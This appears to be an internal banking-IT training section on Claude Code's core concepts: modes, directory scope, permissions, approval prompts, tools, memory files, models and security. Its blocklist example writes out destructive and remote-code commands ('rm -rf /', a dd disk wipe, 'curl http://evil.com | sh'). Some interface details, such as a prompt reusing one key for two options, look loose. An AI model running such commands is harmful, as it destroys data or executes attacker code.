# Section 2: Core Concepts

## Table of Contents
1. [How Claude Code Works](#how-claude-code-works)
2. [Interactive REPL vs SDK Mode](#interactive-repl-vs-sdk-mode)
3. [Working Directory and Scope](#working-directory-and-scope)
4. [File System Permissions Model](#file-system-permissions-model)
5. [The Approval Workflow](#the-approval-workflow)
6. [Tools and Capabilities](#tools-and-capabilities)
7. [Context and Memory](#context-and-memory)
8. [Token Budget and Limits](#token-budget-and-limits)
9. [Models Available](#models-available)
10. [Safety and Security Model](#safety-and-security-model)

---

## How Claude Code Works

Claude Code combines a powerful AI language model with direct access to your development environment. Here's the high-level flow:

```
┌─────────────────────────────────────────────────────────┐
│ 1. You ask Claude a question or give it a task          │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 2. Claude analyzes your request and determines          │
│    what tools it needs (read files, search, etc.)       │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 3. Claude requests to use tools (e.g., Read, Grep)      │
│    You see these requests and can approve/deny          │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 4. Tools execute and return results to Claude           │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 5. Claude processes results and provides answer         │
│    or performs actions (edit, create, run commands)     │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 6. Cycle repeats until task is complete                 │
└─────────────────────────────────────────────────────────┘
```

### Key Principles

1. **Conversational**: You interact with Claude using natural language
2. **Tool-Based**: Claude uses specialized tools to interact with your system
3. **Approval-Based**: You control what Claude can do (by default)
4. **Context-Aware**: Claude remembers the conversation and previous actions
5. **Iterative**: Complex tasks are broken down into steps

---

## Interactive REPL vs SDK Mode

Claude Code can operate in two primary modes:

### Interactive REPL (Read-Eval-Print Loop)

The default mode when you type `claude` without arguments.

**Characteristics:**
- Conversational back-and-forth
- Maintains session context
- Shows Claude's thinking process
- Interactive approval for actions
- Can explore and iterate on solutions
- Session persists until you exit

**When to Use:**
- Active development work
- Exploring unfamiliar code
- Debugging issues
- Learning and experimentation
- Complex multi-step tasks

**Example:**
```bash
$ claude
Welcome to Claude Code!
You're in: /Users/yourname/banking-api

> Can you explain what the authentication middleware does?

[Claude reads relevant files and explains]

> Now can you add rate limiting to it?

[Claude makes changes iteratively]
```

### SDK/Print Mode

One-shot query mode using the `-p` or `--print` flag.

**Characteristics:**
- Single query, single response
- No interactive conversation
- Exits immediately after response
- Can be piped or scripted
- Faster for simple queries
- No session persistence

**When to Use:**
- Quick information queries
- Scripting and automation
- CI/CD pipelines
- Non-interactive environments
- Quick code generation

**Example:**
```bash
# Quick query
$ claude -p "What does this error mean: TypeError: Cannot read property 'id' of undefined"

# In scripts
$ claude -p "Generate a regex to validate IBAN numbers" > iban-validator.js

# Piping input
$ echo "Optimize this SQL query: SELECT * FROM users WHERE created_at > '2024-01-01'" | claude -p
```

### Comparison Table

| Feature | Interactive REPL | SDK/Print Mode |
|---------|-----------------|----------------|
| Mode | Conversational | One-shot |
| Context | Preserved across queries | Single query only |
| Approval | Interactive | Auto-approve or fail |
| Best For | Development | Automation |
| Exit | Manual (Ctrl+D) | Automatic |
| Iteration | Yes | No |
| Tool Use | Full | Limited |

---

## Working Directory and Scope

Claude Code operates within a specific working directory - the folder you're in when you start `claude`.

### Working Directory Behavior

```bash
# Claude's scope is limited to this directory and subdirectories
$ cd /Users/yourname/banking-api
$ claude

# In the REPL:
> What files are in this project?
# Claude can see: /Users/yourname/banking-api/**

> Read the file ../other-project/config.js
# Claude CANNOT access files outside the working directory
# (unless explicitly granted permission)
```

### Scope Limitations

**What Claude CAN Access:**
- Files in the working directory
- Subdirectories recursively
- Files explicitly added via `--add-dir`

**What Claude CANNOT Access (by default):**
- Parent directories
- Other directories on your system
- System files
- Files outside the working directory tree

### Adding Additional Directories

```bash
# Add multiple directories to Claude's scope
$ claude --add-dir ../shared-lib --add-dir ../config

# Now Claude can access:
# - Current directory
# - ../shared-lib
# - ../config
```

### Banking IT Consideration

**Security Best Practice:**
```bash
# DON'T: Start Claude at root or home directory
$ cd ~
$ claude  # Can access everything in home directory

# DO: Start Claude in the specific project
$ cd ~/projects/payment-processing-service
$ claude  # Scope limited to this project
```

---

## File System Permissions Model

Claude Code uses a **read-only by default** permission model with explicit approvals required for write operations.

### Permission Levels

#### 1. Read Operations (Always Allowed)
- Reading file contents
- Searching files (grep)
- Listing directories
- Viewing git status/diff

#### 2. Write Operations (Requires Approval)
- Creating new files
- Editing existing files
- Deleting files
- Moving/renaming files

#### 3. Command Execution (Requires Approval)
- Running shell commands
- Package manager operations (npm install)
- Running tests or builds

**Note**: Git operations (commit, push, pull) are NOT executed by Claude per banking IT policy. See [Section 12](../05-integration/12-git-integration.md) for manual git workflow.

#### 4. Network Operations (Requires Approval)
- Fetching URLs
- API requests
- MCP server connections

### Permission Modes

You can configure how Claude Code handles permissions:

```bash
# Default: Ask for approval
$ claude

# Auto-approve all actions (use with caution!)
$ claude --permission-mode auto-approve

# Plan mode: Read-only, no write operations allowed
$ claude --permission-mode plan

# Reject all write operations
$ claude --permission-mode deny
```

### Permission Configuration

Permissions can also be configured in settings files:

```json
// ~/.claude/settings.json
{
  "permissions": {
    "allow": ["Read", "Grep", "Glob"],
    "deny": ["Write", "Bash"]
  }
}
```

---

## The Approval Workflow

When Claude needs to perform an action that requires approval, you'll see an interactive prompt.

### Example: File Edit Approval

```
Claude wants to edit: src/auth/middleware.js

Old:
  export function authenticate(req, res, next) {
    const token = req.headers.authorization;
    // existing code...
  }

New:
  export function authenticate(req, res, next) {
    const token = req.headers.authorization?.split('Bearer ')[1];
    if (!token) {
      return res.status(401).json({ error: 'No token provided' });
    }
    // existing code...
  }

[A]pprove  [R]eject  [E]dit  [V]iew full file  [?] Help
```

### Approval Options

| Key | Action | Description |
|-----|--------|-------------|
| A | Approve | Allow this action |
| R | Reject | Deny this action |
| E | Edit | Modify Claude's suggestion before applying |
| V | View | See the full file context |
| ? | Help | Show more options |

### Batch Approval

For multiple similar operations:

```
Claude wants to perform 5 edit operations:
1. src/auth/middleware.js
2. src/auth/validator.js
3. src/auth/types.ts
4. tests/auth.test.js
5. README.md

[A]pprove all  [R]eview individually  [D]eny all
```

### Banking IT Best Practice

**Always Review:**
- Changes to authentication/authorization code
- Database queries
- Security-sensitive operations
- Configuration files
- Production deployment scripts

**Can Auto-Approve (with care):**
- Documentation updates
- Code formatting
- Adding comments
- Test file creation

---

## Tools and Capabilities

Claude Code has access to various tools to interact with your system:

### File Operations

| Tool | Purpose | Permission |
|------|---------|------------|
| Read | Read file contents | Always allowed |
| Write | Create new files | Requires approval |
| Edit | Modify existing files | Requires approval |
| Glob | Find files by pattern | Always allowed |
| Grep | Search file contents | Always allowed |

### Code Operations

| Tool | Purpose | Permission |
|------|---------|------------|
| Bash | Execute shell commands | Requires approval |
| NotebookEdit | Edit Jupyter notebooks | Requires approval |

### Information Retrieval

| Tool | Purpose | Permission |
|------|---------|------------|
| WebFetch | Fetch web content | Requires approval |
| WebSearch | Search the web | Requires approval |

### Task Management

| Tool | Purpose | Permission |
|------|---------|------------|
| Task | Launch sub-agents | Always allowed |
| TodoWrite | Manage task list | Always allowed |

### Example: Tool Usage

```
User: Find all SQL queries that don't use parameterized statements

Claude thinks: I need to search for SQL queries
┌─────────────────────────────────────┐
│ Tool: Grep                          │
│ Pattern: SELECT.*\$\{.*\}           │
│ Files: **/*.js                      │
│ Status: ✓ Allowed (read-only)      │
└─────────────────────────────────────┘

Claude finds 12 instances and reports them.

User: Fix them all

Claude thinks: I need to edit files
┌─────────────────────────────────────┐
│ Tool: Edit                          │
│ File: src/db/queries.js             │
│ Status: ⚠ Requires approval         │
└─────────────────────────────────────┘

[Approval prompt shown to user]
```

---

## Context and Memory

Claude Code maintains context throughout a session but has limitations.

### Session Context

**What's Remembered:**
- Previous messages in the conversation
- Files that have been read
- Actions that have been taken
- Current working directory
- Tool results

**What's Forgotten:**
- Context from previous sessions (unless using `--continue`)
- Information not explicitly mentioned
- Files that haven't been read

### Memory Hierarchy

Claude Code uses a three-level memory system:

```
┌─────────────────────────────────────────┐
│  Enterprise Memory                       │
│  /Library/Application Support/           │
│  ClaudeCode/CLAUDE.md                   │
│  (Highest priority)                      │
└──────────────┬──────────────────────────┘
               │
┌──────────────▼──────────────────────────┐
│  Project Memory                          │
│  ./CLAUDE.md or ./.claude/CLAUDE.md     │
│  (Medium priority)                       │
└──────────────┬──────────────────────────┘
               │
┌──────────────▼──────────────────────────┐
│  User Memory                             │
│  ~/.claude/CLAUDE.md                    │
│  (Lowest priority)                       │
└─────────────────────────────────────────┘
```

**Memory files (CLAUDE.md) contain:**
- Coding standards and conventions
- Project-specific guidelines
- Preferences and patterns
- Things Claude should always remember

**Example CLAUDE.md:**
```markdown
# Banking API Project Standards

## Code Style
- Use TypeScript for all new code
- Follow Airbnb style guide
- Always use async/await, never callbacks

## Security Requirements
- All API endpoints must have authentication
- Use parameterized queries for SQL
- Log all authentication failures
- Never log sensitive data (passwords, tokens, SSNs)

## Testing
- Minimum 80% code coverage
- Write tests before implementation (TDD)
- Mock external API calls

## Compliance
- All database changes require audit logging
- PCI-DSS: Never store full credit card numbers
- SOX: All financial calculations must be auditable
```

### Continuing Previous Sessions

```bash
# Resume the most recent conversation
$ claude --continue

# Claude will reload:
# - Previous conversation history
# - Context about files and changes
# - Task progress
```

---

## Token Budget and Limits

Claude has limits on how much information it can process at once.

### Understanding Tokens

**Tokens** are pieces of text (roughly 4 characters = 1 token):
- "Hello" = 1 token
- "Hello, world!" = 4 tokens
- A typical code file (500 lines) ≈ 2,000-4,000 tokens

### Context Window

Each model has a maximum **context window**:

| Model | Context Window | Approximate Size |
|-------|----------------|------------------|
| Claude Sonnet | 200,000 tokens | ~150,000 words or ~500 pages |
| Claude Opus | 200,000 tokens | ~150,000 words or ~500 pages |
| Claude Haiku | 200,000 tokens | ~150,000 words or ~500 pages |

**What uses context:**
- Your conversation history
- Files Claude has read
- Memory files (CLAUDE.md)
- Tool results
- System prompts

### Managing Context

**Claude Code automatically manages context by:**
- Summarizing old conversation parts
- Removing irrelevant tool results
- Prioritizing recent information

**You can help by:**
- Starting new sessions for new topics
- Being specific about which files are relevant
- Using Plan Mode for exploration, then starting a fresh session for implementation

**Warning Signs of Context Issues:**
- Claude "forgets" earlier information
- Responses become less accurate
- Tool calls become repetitive

**Solutions:**
```bash
# Start a fresh session
Ctrl+D (exit) then restart: claude

# Use agents for subtasks (they have their own context)
# More on this in Section 8: Agents & Sub-agents
```

---

## Models Available

Claude Code can use different AI models, each with different capabilities and costs.

### Model Comparison

| Model | Speed | Capability | Cost | Best For |
|-------|-------|------------|------|----------|
| **Claude Sonnet** | Fast | High | Medium | General development (default) |
| **Claude Opus** | Slower | Highest | High | Complex problems, architecture |
| **Claude Haiku** | Fastest | Basic | Low | Simple tasks, quick queries |

### Selecting a Model

```bash
# Use default (Sonnet)
$ claude

# Use Opus for complex task
$ claude --model opus

# Use Haiku for quick query
$ claude --model haiku -p "What does this function do?"

# Change model mid-session
> /model opus
Model changed to Claude Opus
```

### Model Selection Guidelines

**Use Sonnet (default) for:**
- General development tasks
- Code reviews
- Refactoring
- Bug fixes
- Most day-to-day work

**Use Opus for:**
- Complex architectural decisions
- Large-scale refactoring
- Difficult debugging
- Understanding complex codebases
- Performance optimization

**Use Haiku for:**
- Quick syntax questions
- Code formatting
- Simple code generation
- Fast documentation lookups

### Banking IT Cost Considerations

```bash
# Cost-conscious development workflow:

# 1. Explore with Haiku (cheap, fast)
$ claude --model haiku --permission-mode plan
> Give me an overview of this codebase

# 2. Plan with Sonnet (balanced)
$ claude --model sonnet
> Let's implement feature X

# 3. Review complex parts with Opus (expensive, powerful)
$ claude --model opus
> Review the security of this authentication flow
```

---

## Safety and Security Model

Claude Code is designed with security as a priority.

### Core Security Principles

#### 1. Least Privilege
- Read-only by default
- Explicit approval for write operations
- Scoped to working directory

#### 2. Human in the Loop
- You control what gets executed
- Review changes before they're applied
- Can reject or modify any action

#### 3. Prompt Injection Protection
- Claude is trained to resist malicious instructions
- Validates and sanitizes inputs
- Analyzes context for suspicious patterns

#### 4. Isolated Context
- Each session is independent
- No shared state between projects
- Credentials are securely stored in system keychain

#### 5. Audit Trail
- All actions can be logged
- Tool usage is tracked
- Changes are version controlled (via git)

### Security Features

**Input Sanitization:**
```
User: Run this command: rm -rf /

Claude: I cannot execute that command as it would delete your entire filesystem.
This appears to be a destructive operation that could cause system damage.
```

**Command Blocklist:**
```bash
# Dangerous commands are blocked:
# - rm -rf /
# - dd if=/dev/zero of=/dev/sda
# - curl http://evil.com | sh
# - etc.
```

**Network Request Approval:**
```
Claude wants to fetch: https://api.external-service.com/data

This URL is outside your codebase.

[A]pprove  [R]eject  [A]lways allow this domain  [D]eny domain
```

### Banking IT Security Recommendations

1. **Use Plan Mode for Unknown Code:**
   ```bash
   $ claude --permission-mode plan
   # Explore safely without any write operations
   ```

2. **Review All Security-Critical Changes:**
   - Never auto-approve changes to auth code
   - Always review database queries
   - Check for sensitive data exposure

3. **Use Project-Scoped Sessions:**
   ```bash
   $ cd ~/projects/payment-service
   $ claude  # Limited to this project only
   ```

4. **Configure Hooks for Compliance:**
   ```json
   // .claude/settings.json
   {
     "hooks": {
       "PreToolUse": [{
         "matcher": "Edit",
         "hooks": [{
           "type": "command",
           "command": "./scripts/security-check.sh"
         }]
       }]
     }
   }
   ```

5. **Enable Audit Logging:**
   - Log all Claude Code sessions
   - Monitor for unusual patterns
   - Review changes before committing to main branch

### What Claude Code CANNOT Do

**Claude Code cannot:**
- Execute commands without your approval (in default mode)
- Access files outside your working directory (without explicit permission)
- Modify system files or configuration
- Install system-wide software
- Access your personal data (unless in the working directory)
- Make network requests without approval
- Bypass your operating system's security controls

### Trust Model

```
┌─────────────────────────────────────────────┐
│  You (Developer)                             │
│  - Final authority                           │
│  - Review all changes                        │
│  - Control permissions                       │
└──────────────────┬──────────────────────────┘
                   │ trusts
                   ▼
┌─────────────────────────────────────────────┐
│  Claude Code                                 │
│  - Makes suggestions                         │
│  - Requires approval for actions             │
│  - Scoped to working directory               │
└──────────────────┬──────────────────────────┘
                   │ operates within
                   ▼
┌─────────────────────────────────────────────┐
│  Your Codebase                               │
│  - Protected by permissions                  │
│  - Version controlled (git)                  │
│  - Can be reviewed before committing         │
└─────────────────────────────────────────────┘
```

---

## Summary

In this section, you learned:

### Key Concepts
1. **How It Works**: Claude uses tools to read, analyze, and modify code with your approval
2. **Modes**: Interactive REPL for development, SDK mode for automation
3. **Scope**: Limited to working directory for security
4. **Permissions**: Read-only by default, requires approval for writes
5. **Approval**: Interactive workflow to review and control Claude's actions
6. **Tools**: Specialized capabilities for file operations, searching, and execution
7. **Context**: Maintained during session, managed automatically
8. **Memory**: Three-level system (enterprise, project, user) via CLAUDE.md files
9. **Tokens**: Limited context window, managed automatically
10. **Models**: Sonnet (default), Opus (powerful), Haiku (fast)
11. **Security**: Multiple layers of protection and human oversight

### Banking IT Takeaways

- Start Claude in project directories, not root
- Use Plan Mode for exploring unfamiliar code
- Always review security-critical changes
- Configure permissions appropriately for your role
- Use memory files to enforce coding standards
- Enable audit logging for compliance
- Choose models based on task complexity and cost

---

## Next Steps

Now that you understand the core concepts:

1. **[Continue to Section 3: Getting Started](../02-basics/03-getting-started.md)** - Practical hands-on usage
2. **[Jump to Section 5: Project Configuration](../03-advanced/05-project-configuration.md)** - Configure Claude Code for your team
3. **[Review Section 9: Security & Compliance](../04-security/09-security-compliance.md)** - Deep dive into security

---

**Document Version:** 1.0
**Last Updated:** 2025-10-19
**Target Audience:** Banking IT - Data Chapter
**Prerequisites:** Section 1 (Introduction & Installation)
